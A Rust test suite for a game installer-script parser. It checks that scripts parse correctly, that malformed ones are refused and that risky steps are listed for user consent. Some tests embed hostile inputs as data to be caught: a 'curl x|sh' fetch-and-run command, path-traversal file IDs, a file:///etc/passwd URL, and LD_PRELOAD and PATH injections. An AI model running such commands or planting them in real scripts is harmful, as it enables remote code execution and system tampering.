//! Parsing tests: the fixtures, refusals (unknown commands, tasks, keys and
//! variables, shadowing, URLs, launchers) and the consent plan.

use crate::model::*;
use crate::tests::*;
use crate::*;

// ----- Parsing -----

#[test]
fn parses_gog_autosetup_script() {
    let s = Script::parse(&gog_fixture()).unwrap();
    assert_eq!(s.info.name, "Darkest Dungeon");
    assert_eq!(s.info.game_slug, "darkest-dungeon");
    assert_eq!(s.info.version, "GOG");
    assert_eq!(s.info.author.as_deref(), Some("tester"));
    assert_eq!(s.info.gogid.as_deref(), Some("1719198803"));
    assert_eq!(
        s.info.page_url(),
        "https://lutris.net/games/darkest-dungeon/"
    );
    assert_eq!(
        s.files[0].source,
        FileSource::UserPick {
            prompt: Some("Select the GOG setup file".into())
        }
    );
    match &s.steps[0].command {
        Command::StoreAutosetup(a) => {
            assert_eq!(a.store, AutosetupStore::Gog);
            assert_eq!(a.id, "1719198803");
            assert_eq!(a.file.as_deref(), Some("installer"));
        }
        other => panic!("unexpected {other:?}"),
    }
    assert_eq!(s.wine_version(), Some("lutris-GE-Proton8-26-x86_64"));
}

#[test]
fn parses_wine_setup_script() {
    let checksum = format!("md5:{}", "0".repeat(32));
    let s = Script::parse(&wine_fixture(EXAMPLE, &checksum)).unwrap();
    assert_eq!(s.files.len(), 2);
    let patch = &s.files[1];
    assert_eq!(patch.filename.as_deref(), Some("patch.zip"));
    assert_eq!(
        patch.checksum,
        Some(Checksum {
            algorithm: HashAlgorithm::Md5,
            hex: "0".repeat(32)
        })
    );
    let kinds: Vec<&str> = s.steps.iter().map(|s| s.command.name()).collect();
    assert_eq!(
        kinds,
        [
            "create_prefix",
            "winetricks",
            "wineexec",
            "extract",
            "set_regedit"
        ]
    );
    assert_eq!(s.steps[2].description.as_deref(), Some("Running the setup"));
    match &s.steps[4].command {
        Command::Task(Task::SetRegedit(r)) => {
            assert_eq!(r.kind, RegType::Dword);
            assert_eq!(r.value, "30002");
        }
        other => panic!("unexpected {other:?}"),
    }
    assert_eq!(
        s.system_env.get("DXVK_HUD").map(String::as_str),
        Some("fps")
    );
    assert_eq!(s.game.arch.as_deref(), Some("win64"));
    assert_eq!(s.wine_version(), Some("wine-ge-8-26"));
}

#[test]
fn parses_dosbox_script() {
    let s = Script::parse(&dosbox_fixture(EXAMPLE)).unwrap();
    match &s.steps[2].command {
        Command::WriteConfig { entries, merge, .. } => {
            assert!(*merge);
            let keys: Vec<(&str, &str, &str)> = entries
                .iter()
                .map(|e| (e.section.as_str(), e.key.as_str(), e.value.as_str()))
                .collect();
            assert!(keys.contains(&("sdl", "fullscreen", "true")));
            assert!(keys.contains(&("cpu", "cycles", "max")));
        }
        other => panic!("unexpected {other:?}"),
    }
    assert!(s.runner_sections.contains_key("dosbox"));
}

#[test]
fn parses_linux_script_with_shell_command() {
    let s = Script::parse(&linux_fixture(EXAMPLE)).unwrap();
    assert!(s.runs_shell());
    match &s.steps[2].command {
        Command::InputMenu(m) => {
            assert_eq!(m.id.as_deref(), Some("lang"));
            assert_eq!(m.options.len(), 2);
            assert_eq!(m.options[1].label, "Deutsch");
        }
        other => panic!("unexpected {other:?}"),
    }
}

#[test]
fn parses_json_and_result_lists() {
    let json = serde_json::json!({
        "results": [
            {"name": "A", "game_slug": "a", "version": "1", "slug": "a-1", "runner": "linux",
             "script": {"game": {"exe": "a"}, "installer": [{"mkdir": "$GAMEDIR/x"}]}},
            {"name": "B", "game_slug": "b", "version": "1", "slug": "b-1", "runner": "linux",
             "script": {"game": {"exe": "b"}}}
        ]
    })
    .to_string();
    assert_eq!(Script::parse_all(&json).unwrap().len(), 2);
    assert_eq!(err(&json), ScriptError::SeveralScripts(2));
    // A bare script (no `script:` envelope).
    let bare =
        "name: C\ngame_slug: c\nrunner: linux\ngame:\n  exe: c\ninstaller:\n- mkdir: $GAMEDIR/d\n";
    let s = Script::parse(bare).unwrap();
    assert_eq!(s.steps.len(), 1);
}

// ----- Refusals -----

#[test]
fn unknown_command_names_step() {
    let text = steps_script(
        "linux",
        "  - f: https://example.org/f",
        "  - mkdir: $GAMEDIR/a\n  - frobnicate: $GAMEDIR",
        "    exe: a",
    );
    let e = err(&text);
    assert_eq!(
        e,
        ScriptError::UnknownCommand {
            step: 2,
            name: "frobnicate".into()
        }
    );
    assert!(e.to_string().contains("Step 2"));
    assert!(e.to_string().contains("frobnicate"));
    // Lutris exposes interpreter internals as commands; Irori does not.
    let text = steps_script("linux", "  []", "  - revert: x", "    exe: a");
    assert!(matches!(
        err(&text),
        ScriptError::UnknownCommand { step: 1, .. }
    ));
}

#[test]
fn unknown_task_and_key_are_refused() {
    let text = steps_script(
        "wine",
        "  []",
        "  - task:\n      name: winecfg",
        "    exe: a",
    );
    assert_eq!(
        err(&text),
        ScriptError::UnknownTask {
            step: 1,
            name: "winecfg".into()
        }
    );
    let text = steps_script(
        "wine",
        "  []",
        "  - task:\n      name: runner.wineexec\n      executable: a",
        "    exe: a",
    );
    assert!(matches!(err(&text), ScriptError::UnknownTask { .. }));
    let text = steps_script(
        "linux",
        "  - f: https://example.org/f.zip",
        "  - extract:\n      file: f\n      dts: $GAMEDIR",
        "    exe: a",
    );
    assert_eq!(
        err(&text),
        ScriptError::UnknownKey {
            location: "Step 1 (extract)".into(),
            key: "dts".into()
        }
    );
    let typo = "name: C\ngame_slug: c\nrunner: linux\ninstaler:\n- mkdir: x\n";
    assert!(matches!(err(typo), ScriptError::UnknownKey { key, .. } if key == "instaler"));
}

#[test]
fn unknown_variables_are_refused() {
    let text = steps_script("linux", "  []", "  - mkdir: $GAMEDRI/data", "    exe: a");
    assert_eq!(
        err(&text),
        ScriptError::UnknownVariable {
            location: "Step 1 (mkdir)".into(),
            name: "GAMEDRI".into()
        }
    );
    // In shell commands, shell locals pass; unknown upper-case names do not.
    let ok = steps_script(
        "linux",
        "  []",
        "  - execute:\n      command: for f in *; do echo $f; done; echo $PATH",
        "    exe: a",
    );
    assert!(Script::parse(&ok).is_ok());
    let bad = steps_script(
        "linux",
        "  []",
        "  - execute:\n      command: rm -rf $GAMEDRI/cache",
        "    exe: a",
    );
    assert!(matches!(err(&bad), ScriptError::UnknownVariable { name, .. } if name == "GAMEDRI"));
    let in_game = steps_script("linux", "  []", "  - mkdir: $GAMEDIR/a", "    exe: $NOPE/a");
    assert!(
        matches!(err(&in_game), ScriptError::UnknownVariable { location, .. } if location == "Game section")
    );
}

#[test]
fn builtins_cannot_be_shadowed() {
    let text =
        "name: C\ngame_slug: c\nrunner: linux\nvariables:\n  GAMEDIR: /tmp\ngame:\n  exe: a\n";
    assert_eq!(
        err(text),
        ScriptError::ShadowedVariable {
            name: "GAMEDIR".into()
        }
    );
    let file = steps_script(
        "linux",
        "  - HOME: https://example.org/h",
        "  []",
        "    exe: a",
    );
    assert!(matches!(err(&file), ScriptError::ShadowedVariable { name } if name == "HOME"));
    let input = steps_script(
        "linux",
        "  - INPUT_x: https://example.org/h",
        "  []",
        "    exe: a",
    );
    assert!(matches!(err(&input), ScriptError::ShadowedVariable { .. }));
}

#[test]
fn only_http_downloads_and_valid_checksums() {
    for url in [
        "ftp://example.org/f",
        "file:///etc/passwd",
        "/home/me/game.zip",
        "$WINESTEAM:1:x",
    ] {
        let text = steps_script("linux", &format!("  - f: \"{url}\""), "  []", "    exe: a");
        assert!(
            matches!(err(&text), ScriptError::UnsupportedUrl { .. }),
            "{url}"
        );
    }
    let text = steps_script(
        "linux",
        "  - f:\n      url: https://example.org/f\n      filename: f\n      checksum: crc:1234",
        "  []",
        "    exe: a",
    );
    assert!(matches!(err(&text), ScriptError::Invalid { .. }));
    let steam = steps_script("linux", "  - s: \"$STEAM:220:hl2\"", "  []", "    exe: a");
    let s = Script::parse(&steam).unwrap();
    assert_eq!(
        s.files[0].source,
        FileSource::Steam {
            appid: "220".into(),
            path: "hl2".into()
        }
    );
}

#[test]
fn launchers_are_refused_in_favour_of_native_stores() {
    let epic =
        "name: Epic Games Store\ngame_slug: epic-games-store\nrunner: wine\ngame:\n  exe: a.exe\n";
    assert_eq!(
        err(epic),
        ScriptError::PreferNative {
            launcher: NativeLauncher::EpicGames
        }
    );
    let ea = steps_script(
        "wine",
        "  []",
        "  []",
        "    exe: $GAMEDIR/drive_c/Program Files/Electronic Arts/EA Desktop/EA Desktop/EADesktop.exe",
    );
    assert_eq!(
        err(&ea),
        ScriptError::PreferNative {
            launcher: NativeLauncher::EaApp
        }
    );
    let ubi = "name: G\ngame_slug: g\nrunner: wine\nscript:\n  requires: ubisoft-connect\n  game:\n    exe: g.exe\n";
    assert!(matches!(
        err(ubi),
        ScriptError::PreferNative {
            launcher: NativeLauncher::UbisoftConnect
        }
    ));
}

// ----- Consent -----

#[test]
fn consent_lists_everything_that_needs_approval() {
    let tmp = tempfile::tempdir().unwrap();
    let ctx = ctx(tmp.path());
    let linux = Script::parse(&linux_fixture(EXAMPLE)).unwrap();
    let c = consent(&linux, &ctx);
    assert_eq!(c.downloads.len(), 1);
    assert_eq!(c.downloads[0].host, "downloads.example.org");
    assert!(c.needs_shell_ack());
    assert_eq!(
        c.shell_commands[0].command,
        r#"cd "$GAMEDIR" && for f in bin/*; do echo "$f"; done"#
    );
    assert!(
        c.shell_commands[0]
            .resolved
            .contains(&*ctx.game_dir.to_string_lossy())
    );
    assert_eq!(c.programs.len(), 1);
    assert_eq!(c.programs[0].kind, ProgramKind::Native);
    assert!(c.outside_writes.is_empty());

    let checksum = format!("md5:{}", "0".repeat(32));
    let wine = Script::parse(&wine_fixture(EXAMPLE, &checksum)).unwrap();
    let c = consent(&wine, &ctx);
    assert!(!c.needs_shell_ack());
    assert_eq!(c.registry[0].key, "MaxVersionGL");
    assert_eq!(c.registry[0].kind, RegType::Dword);
    assert_eq!(c.winetricks[0].verbs, ["d3dx9", "vcrun2019"]);
    assert_eq!(c.programs[0].kind, ProgramKind::Wine);
    assert!(c.programs[0].program.ends_with("example_setup.exe"));

    let gog = Script::parse(&gog_fixture()).unwrap();
    let c = consent(&gog, &ctx);
    assert_eq!(c.autosetups[0].store, AutosetupStore::Gog);
    assert_eq!(
        c.user_files[0].prompt.as_deref(),
        Some("Select the GOG setup file")
    );

    let outside = steps_script(
        "linux",
        "  []",
        "  - write_file:\n      file: $HOME/.config/game/settings.ini\n      content: x\n  - write_file:\n      file: $GAMEDIR/inside.txt\n      content: y",
        "    exe: inside.txt",
    );
    let s = Script::parse(&outside).unwrap();
    let c = consent(&s, &ctx);
    assert_eq!(c.outside_writes.len(), 1);
    assert_eq!(
        c.outside_writes[0].resolved.as_deref(),
        Some(ctx.home.join(".config/game/settings.ini").as_path())
    );
    assert_eq!(c.outside_writes[0].step, Some(1));
}

// ----- Sandbox and consent regressions -----

fn linux_script(files: &str, game: &str, steps: &str) -> String {
    format!(
        "name: T\ngame_slug: t\nversion: V\nslug: t-v\nrunner: linux\nscript:\n{files}  game:\n{game}  installer:\n{steps}"
    )
}

#[test]
fn a_file_id_cannot_leave_the_cache() {
    for id in ["../../../.config/autostart", "/etc/x", "a/b", ".."] {
        let text = linux_script(
            &format!("  files:\n  - \"{id}\": {{url: https://example.org/x, filename: x}}\n"),
            "    exe: x\n",
            "  - mkdir: $GAMEDIR/a\n",
        );
        assert!(Script::parse(&text).is_err(), "{id}");
    }
}

#[test]
fn consent_shows_what_play_starts_and_every_variable() {
    let tmp = tempfile::tempdir().unwrap();
    let ctx = ctx(tmp.path());
    let text = format!(
        "{}  system:\n    env:\n      LD_PRELOAD: /x.so\n",
        linux_script(
            "",
            "    exe: run.sh\n    args: --fast\n",
            "  - execute: {command: echo hi, env: {PATH: /evil}}\n",
        )
    );
    let c = consent(&Script::parse(&text).unwrap(), &ctx);
    let game = c.game.unwrap();
    assert!(game.program.ends_with("run.sh") || game.program == "run.sh");
    assert_eq!(game.args, "--fast");
    assert!(
        c.env
            .iter()
            .any(|e| e.key == "LD_PRELOAD" && e.step.is_none())
    );
    assert!(c.env.iter().any(|e| e.key == "PATH" && e.step == Some(1)));
}

#[test]
fn running_an_interpreter_needs_the_shell_acknowledgement() {
    let tmp = tempfile::tempdir().unwrap();
    let ctx = ctx(tmp.path());
    let text = linux_script(
        "",
        "    exe: run.sh\n",
        "  - execute: {file: /bin/sh, args: -c 'curl x|sh'}\n",
    );
    assert!(consent(&Script::parse(&text).unwrap(), &ctx).needs_shell_ack());
}
